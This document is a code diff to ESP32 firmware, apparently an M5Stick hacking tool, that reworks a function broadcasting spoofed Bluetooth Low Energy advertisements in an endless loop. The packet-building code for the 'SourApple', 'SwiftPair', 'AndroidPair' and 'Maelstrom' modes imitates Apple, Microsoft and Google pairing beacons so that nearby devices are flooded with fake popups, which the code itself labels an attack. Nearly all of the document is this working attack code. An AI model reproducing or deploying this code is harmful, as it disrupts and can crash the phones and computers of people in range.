@@ -265,11 +265,11 @@ BLEAdvertising *pAdvertising;
 
 /**********************************************************************
 **  Function: aj_adv                                     
-**  spams BLE                                           
+**  spams BLE from choice                                
 **********************************************************************/
-//TODO: add main loop to continue advertising
 void aj_adv(int ble_choice){
-  bool rstOverride;
+  tft.fillScreen(TFT_BLACK);
+  bool rstOverride = true;
   bool swiftPair;
   bool androidPair;
   bool sourApple;
@@ -277,175 +277,150 @@ void aj_adv(int ble_choice){
   int advtime;
 
   switch(ble_choice){
+    case 0:
+      data = Airpods;
+      sourApple = true;
+      displayRedStripe("Applejuice");
+      delay(500);
+      break;
     case 1:
       swiftPair = true;
+      displayRedStripe("SwiftPair");
+      delay(500);
       break;
     case 2:
       androidPair = true;
+      displayRedStripe("AndroidPair");
+      delay(500);
       break;
     case 3:
       sourApple = true;
+      data = AppleTVPair;
+      displayRedStripe("SourApple");
+      delay(500);
       break;
     case 4:
       maelstrom = true;
+      displayRedStripe("Maelstrom");
+      delay(500);
       break;
   }
-  rstOverride = true;
-  if (sourApple || swiftPair || androidPair || maelstrom){
-    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
-    advtime = 0; // bypass ajDelay counter
-  }
-  if (millis() > advtime ){
-    advtime = millis();
-    pAdvertising->stop(); // This is placed here mostly for timing.
-                          // It allows the BLE beacon to run through the loop.
-    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-    if (sourApple){
-      Serial.print("advertising");
-      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
-      // Original credits for algorithm ECTO-1A & WillyJL
-      uint8_t packet[17];
-      uint8_t size = 17;
-      uint8_t i = 0;
-      packet[i++] = size - 1;    // Packet Length
-      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
-      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
-      packet[i++] = 0x00;        // ...
-      packet[i++] = 0x0F;  // Type
-      packet[i++] = 0x05;                        // Length
-      packet[i++] = 0xC1;                        // Action Flags
-      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-      packet[i++] = types[rand() % sizeof(types)];  // Action Type
-      esp_fill_random(&packet[i], 3); // Authentication Tag
-      i += 3;
-      packet[i++] = 0x00;  // ???
-      packet[i++] = 0x00;  // ???
-      packet[i++] =  0x10;  // Type ???
-      esp_fill_random(&packet[i], 3);
-      oAdvertisementData.addData(std::string((char *)packet, 17));
-      for (int i = 0; i < sizeof packet; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
-    } else if (swiftPair) {
-      const char* display_name = generateRandomName();
-      Serial.printf(display_name);
-      uint8_t display_name_len = strlen(display_name);
-      uint8_t size = 7 + display_name_len;
-      uint8_t* packet = (uint8_t*)malloc(size);
-      uint8_t i = 0;
-      packet[i++] = size - 1; // Size
-      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
-      packet[i++] = 0x06; // Company ID (Microsoft)
-      packet[i++] = 0x00; // ...
-      packet[i++] = 0x03; // Microsoft Beacon ID
-      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
-      packet[i++] = 0x80; // Reserved RSSI Byte
-      for (int j = 0; j < display_name_len; j++) {
-        packet[i + j] = display_name[j];
-      }
-      for (int i = 0; i < size; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
-
-      i += display_name_len;  
-      oAdvertisementData.addData(std::string((char *)packet, size));
-      free(packet);
-      free((void*)display_name);
-    } else if (androidPair) {
-      Serial.print("spamming adv");
-      uint8_t packet[14];
-      uint8_t i = 0;
-      packet[i++] = 3;  // Packet Length
-      packet[i++] = 0x03; // AD Type (Service UUID List)
-      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
-      packet[i++] = 0xFE; // ...
-      packet[i++] = 6; // Size
-      packet[i++] = 0x16; // AD Type (Service Data)
-      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
-      packet[i++] = 0xFE; // ...
-      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
-      packet[i++] = (model >> 0x10) & 0xFF;
-      packet[i++] = (model >> 0x08) & 0xFF;
-      packet[i++] = (model >> 0x00) & 0xFF;
-      packet[i++] = 2; // Size
-      packet[i++] = 0x0A; // AD Type (Tx Power Level)
-      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
-
-      oAdvertisementData.addData(std::string((char *)packet, 14));
-      for (int i = 0; i < sizeof packet; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
-    } else {
-      Serial.print("ADV");
-      if (deviceType >= 18){
-        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
-      } else {
-        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
-      }
-      for (int i = 0; i < sizeof(Airpods); i ++) {
-        Serial.printf("%02x", data[i]);
-      }      
-      Serial.println("");
+  for(;;){
+    if (sourApple || swiftPair || androidPair || maelstrom){
+      delay(20);   // 20msec delay instead of ajDelay for SourApple attack
+      advtime = 0; // bypass ajDelay counter
     }
-    
-    pAdvertising->setAdvertisementData(oAdvertisementData);
-    pAdvertising->start();
-#if defined(M5LED)
-    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
-    delay(10);
-    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
-#endif
-  }
-  if (checkSelPress()) {
+    if (millis() > advtime ){
+      advtime = millis();
+      pAdvertising->stop(); // This is placed here mostly for timing.
+                            // It allows the BLE beacon to run through the loop.
+      BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+      if (sourApple){
+        Serial.print("advertising");
+        // Some code borrowed from RapierXbox/ESP32-Sour-Apple
+        // Original credits for algorithm ECTO-1A & WillyJL
+        uint8_t packet[17];
+        uint8_t size = 17;
+        uint8_t i = 0;
+        packet[i++] = size - 1;    // Packet Length
+        packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+        packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+        packet[i++] = 0x00;        // ...
+        packet[i++] = 0x0F;  // Type
+        packet[i++] = 0x05;                        // Length
+        packet[i++] = 0xC1;                        // Action Flags
+        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+        packet[i++] = types[rand() % sizeof(types)];  // Action Type
+        esp_fill_random(&packet[i], 3); // Authentication Tag
+        i += 3;
+        packet[i++] = 0x00;  // ???
+        packet[i++] = 0x00;  // ???
+        packet[i++] =  0x10;  // Type ???
+        esp_fill_random(&packet[i], 3);
+        oAdvertisementData.addData(std::string((char *)packet, 17));
+        for (int i = 0; i < sizeof packet; i ++) {
+          Serial.printf("%02x", packet[i]);
+        }
+      } else if (swiftPair) {
+        const char* display_name = generateRandomName();
+        Serial.printf(display_name);
+        uint8_t display_name_len = strlen(display_name);
+        uint8_t size = 7 + display_name_len;
+        uint8_t* packet = (uint8_t*)malloc(size);
+        uint8_t i = 0;
+        packet[i++] = size - 1; // Size
+        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+        packet[i++] = 0x06; // Company ID (Microsoft)
+        packet[i++] = 0x00; // ...
+        packet[i++] = 0x03; // Microsoft Beacon ID
+        packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
+        packet[i++] = 0x80; // Reserved RSSI Byte
+        for (int j = 0; j < display_name_len; j++) {
+          packet[i + j] = display_name[j];
+        }
+        for (int i = 0; i < size; i ++) {
+          Serial.printf("%02x", packet[i]);
+        }
+        Serial.println("");
 
-    sourApple = false;
-    swiftPair = false;
-    maelstrom = false;
-    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
-    delay(250);
-  }
+        i += display_name_len;  
+        oAdvertisementData.addData(std::string((char *)packet, size));
+        free(packet);
+        free((void*)display_name);
+      } else if (androidPair) {
+        Serial.print("spamming adv");
+        uint8_t packet[14];
+        uint8_t i = 0;
+        packet[i++] = 3;  // Packet Length
+        packet[i++] = 0x03; // AD Type (Service UUID List)
+        packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+        packet[i++] = 0xFE; // ...
+        packet[i++] = 6; // Size
+        packet[i++] = 0x16; // AD Type (Service Data)
+        packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+        packet[i++] = 0xFE; // ...
+        const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+        packet[i++] = (model >> 0x10) & 0xFF;
+        packet[i++] = (model >> 0x08) & 0xFF;
+        packet[i++] = (model >> 0x00) & 0xFF;
+        packet[i++] = 2; // Size
+        packet[i++] = 0x0A; // AD Type (Tx Power Level)
+        packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
+        oAdvertisementData.addData(std::string((char *)packet, 14));
+        for (int i = 0; i < sizeof packet; i ++) {
+          Serial.printf("%02x", packet[i]);
+        }
+        Serial.println("");
+      } else {
+        Serial.print("ADV");
+        if (deviceType >= 18){
+          oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+        } else {
+          oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+        }
+        for (int i = 0; i < sizeof(Airpods); i ++) {
+          Serial.printf("%02x", data[i]);
+        }      
+        Serial.println("");
+      }
+      
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->start();
+  #if defined(M5LED)
+      digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
+      delay(10);
+      digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
+  #endif
+    }
+    if (checkSelPress()) {
+
+      sourApple = false;
+      swiftPair = false;
+      maelstrom = false;
+      pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
+      delay(250);
+    }
+
+  }
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
